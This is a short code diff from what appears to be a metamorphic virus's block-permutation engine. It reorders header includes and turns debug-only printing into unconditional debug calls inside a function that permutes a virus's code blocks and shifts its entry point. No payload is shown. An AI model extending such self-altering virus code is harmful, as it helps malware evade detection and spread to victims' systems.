@@ -1,12 +1,11 @@
 
 #include "blocks.h"
-#include "errors.h"
-#include "compiler_utils.h"
-
-#include "utils.h"
-#include "visual.h"
 #include "disasm.h"
 #include "bytes.h"
+#include "utils.h"
+#include "compiler_utils.h"
+#include "errors.h"
+#include "debug.h"
 
 /*
 ** permutate_blocks
@@ -412,9 +411,9 @@ bool		permutate_blocks(struct safe_ptr virus_ref,   \
 	|| !shift_entry_point(virus_address_in_ref, virus_address_shift, blocks)
 	|| !write_permutated_code(virus_ref, virus_buffer_ref, blocks, virus_buffer_size))
 		return errors(ERR_THROW, _ERR_T_PERMUTATE_BLOCKS);
-#ifdef DEBUG
-	print_split_blocks(block_memory.blocks, NBLOCKS, virus_ref, virus_buffer_ref);
-	print_general(virus_ref, virus_buffer_ref, (size_t)virus_address_in_ref, *virus_address_shift, *virus_buffer_size, seed);
-#endif
+
+	debug_print_split_blocks(block_memory.blocks, NBLOCKS, virus_ref, virus_buffer_ref);
+	debug_print_general(virus_ref, virus_buffer_ref, (size_t)virus_address_in_ref, *virus_address_shift, *virus_buffer_size, seed);
+
 	return true;
 }
